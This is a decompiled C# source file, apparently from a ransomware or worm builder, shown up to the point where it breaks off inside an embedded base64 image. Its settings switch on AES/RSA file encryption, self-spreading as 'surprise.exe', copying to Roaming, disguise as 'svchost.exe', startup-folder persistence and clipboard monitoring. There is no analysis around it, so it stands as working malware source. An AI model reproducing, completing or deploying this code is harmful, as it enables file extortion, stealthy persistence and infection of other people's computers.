using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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